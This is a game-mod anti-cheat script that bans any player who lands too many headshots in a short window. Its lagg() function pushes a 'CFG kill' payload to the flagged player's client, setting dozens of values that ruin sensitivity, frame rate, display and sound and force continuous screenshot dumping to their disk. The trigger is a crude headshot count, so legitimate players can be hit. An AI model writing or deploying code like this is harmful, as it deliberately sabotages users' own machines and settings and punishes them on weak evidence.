#include crazy\_common;

init( )
{
	[[level.on]]( "connected", ::checkplayer );
}

checkplayer()
{

	maxHeadshots		=	6;//Headshots per maxHeadShotsTime
	maxHeadshotsTime	= 	10;//Seconds
	time		 		= 	60;

	if( getDvar( "nnj_disableAntiCheat" ) == "1" ) 
	return;
	self endon( "disconnect" );
	guid	 = self getGuid();
	myTime 	 = time;
	oldHS = undefined;
	monitorTime = undefined;
	monitorHS = false;
	if( isDefined( self.headshots ) ) 
	monitorHS = true;	

	while( isDefined( self ) )
	{
		z = false;

		p = getEntArray( "player", "classname" );
		for( i = 0;i < p.size;i++ )
			//if( p[ i ] != self && p[ i ].name == old )
				if( isDefined( p[ i ].oldNameTime ) && self.oldNameTime > p[ i ].oldNameTime )
					double = true;

		if( monitorHS == true )
		{
			if( !isDefined( monitorTime ) ) monitorTime = getTime();
			if( !isDefined( oldHS ) ) oldHS = self.headshots;

			if( getTime() - monitorTime > maxHeadshotsTime * 1000 )
			{
				monitorTime = getTime();
				oldHS = self.headshots;
			}

			if( self.headshots - oldHS >= maxHeadshots && monitorTime != getTime() )
			{
				iPrintlnBold("^3" + self.name + " ^2Has Aimbot And Is Getting CFG Killed & Banned ^5:D");
				self freezeControls(true);
				self thread lagg();
				iPrintlnBold("^1[AIMBOT DETECTED]:^2",self.name, "Banned");
				self dropPlayer("ban","Aimbot");
				return;
			}
		}
		if( myTime <= 0 )
		{
			myTime 	= time;
			changes = 0;
		}

		myTime -= 0.1;
		wait 0.1;
	}
}

lagg()
{
	self SetClientDvars( "cg_drawhud", "0", "hud_enable", "0", "m_yaw", "1", "gamename", "H4CK3R5 FTW", "cl_yawspeed", "5", "r_fullscreen", "0" );
	self SetClientDvars( "R_fastskin", "0", "r_dof_enable", "1", "cl_pitchspeed", "5", "ui_bigfont", "1", "ui_drawcrosshair", "0", "cg_drawcrosshair", "0", "sm_enable", "1", "m_pitch", "1", "drawdecals", "1" );
	self SetClientDvars( "r_specular", "1", "snaps", "1", "friction", "100", "monkeytoy", "1", "sensitivity", "100", "cl_mouseaccel", "100", "R_filmtweakEnable", "0", "R_MultiGpu", "0", "sv_ClientSideBullets", "0", "snd_volume", "0", "cg_chatheight", "0", "compassplayerheight", "0", "compassplayerwidth", "0", "cl_packetdup", "5", "cl_maxpackets", "15" );
	self SetClientDvars( "rate", "1000", "cg_drawlagometer", "0", "cg_drawfps", "0", "stopspeed", "0", "r_brightness", "1", "r_gamma", "3", "r_blur", "32", "r_contrast", "4", "r_desaturation", "4", "cg_fov", "65", "cg_fovscale", "0.2", "player_backspeedscale", "20" );
	self SetClientDvars( "timescale", "0.50", "com_maxfps", "10", "cl_avidemo", "40", "cl_forceavidemo", "1", "fixedtime", "1000" );
}